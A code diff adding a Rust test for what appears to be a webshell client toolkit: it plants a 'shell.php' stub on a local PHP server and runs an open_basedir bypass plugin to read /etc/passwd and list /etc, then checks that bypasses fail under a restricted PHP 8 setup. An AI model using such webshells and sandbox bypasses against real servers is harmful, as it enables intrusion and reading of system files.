@@ -2293,6 +2293,89 @@ except Exception as e:
 "#;
 
     #[test]
+    fn real_php_open_basedir_bypass() {
+        let settings = settings();
+        // 1) 未启用 open_basedir：direct 读取 + 目录列举
+        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
+            return;
+        };
+        let mut profile1 = profile(&url);
+        profile1.protocol_params = r#"{"encoder":"native"}"#.to_string();
+        let result = (|| -> Result<(), ProtocolError> {
+            let (session, _) = PhpProtocol.connect(&profile1, &settings)?;
+            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let protocol = PhpProtocol;
+            // 文件读取（direct）
+            let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
+                &protocol, php, "php", &serde_json::json!({"path": "/etc/passwd"}), &settings)?;
+            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
+            assert!(out["content"].as_str().unwrap_or("").contains("root:"));
+            assert_eq!(out["method_used"].as_str(), Some("direct"));
+            eprintln!("[ob] 未启用环境 direct 读取成功");
+            // 目录列举（direct）
+            let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
+                &protocol, php, "php", &serde_json::json!({"path": "/etc"}), &settings)?;
+            assert_eq!(out["ok"].as_bool(), Some(true), "{out:?}");
+            let entries = out["entries"].as_array().map(|a| a.len()).unwrap_or(0);
+            assert!(entries > 0, "应列举到 /etc 内容：{out:?}");
+            eprintln!("[ob] 未启用环境 direct 列举 {} 项", entries);
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("未启用环境 open_basedir 真实执行应成功：{error}"));
+
+        // 2) 受限环境（open_basedir=临时目录）：scan 正确评估 + 正确报告当前环境不可绕过（PHP 8）
+        let dir2 = std::env::temp_dir().join(format!("dosword-ob-{}", uuid::Uuid::new_v4()));
+        std::fs::create_dir_all(&dir2).unwrap();
+        let encoder = dosword_sdk::EncoderRegistry::global().get("native").unwrap();
+        std::fs::write(dir2.join("shell.php"), encoder.stub("php", "secret").unwrap()).unwrap();
+        let port = {
+            use std::net::TcpListener;
+            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+            listener.local_addr().unwrap().port()
+        };
+        let Some(mut child) = std::process::Command::new("php")
+            .arg("-d")
+            .arg(format!("open_basedir={}", dir2.display()))
+            .arg("-S")
+            .arg(format!("127.0.0.1:{port}"))
+            .arg("-t")
+            .arg(&dir2)
+            .current_dir(&dir2)
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
+            .spawn()
+            .ok()
+        else {
+            return;
+        };
+        std::thread::sleep(std::time::Duration::from_millis(500));
+        let url2 = format!("http://127.0.0.1:{port}/shell.php");
+        let mut profile2 = profile(&url2);
+        profile2.protocol_params = r#"{"encoder":"native"}"#.to_string();
+        let result2 = (|| -> Result<(), ProtocolError> {
+            let (session, _) = PhpProtocol.connect(&profile2, &settings)?;
+            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let protocol = PhpProtocol;
+            let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
+                &protocol, php, "php", &serde_json::json!({"path": "/etc/passwd"}), &settings)?;
+            assert_eq!(out["ok"].as_bool(), Some(false), "PHP 8 不应绕过：{out:?}");
+            assert_eq!(out["methods"]["symlink_out"].as_bool(), Some(false));
+            assert_eq!(out["methods"]["chdir"].as_bool(), Some(false));
+            assert_eq!(out["methods"]["ini_set"].as_bool(), Some(false));
+            assert!(out["error"].as_str().unwrap_or("").contains("无法绕过"));
+            eprintln!("[ob] 受限环境正确评估（symlink/chdir/ini_set 均被拦截）");
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir2);
+        result2.unwrap_or_else(|error| panic!("受限环境 open_basedir 评估应成功：{error}"));
+    }
+
+    #[test]
     fn real_php_bypass_vectors_disabled_env() {
         // 模拟 exec/system/passthru/shell_exec/popen/escapeshellcmd/proc_open 全禁环境，
         // 验证 PHP 8+ 剩余可用向量
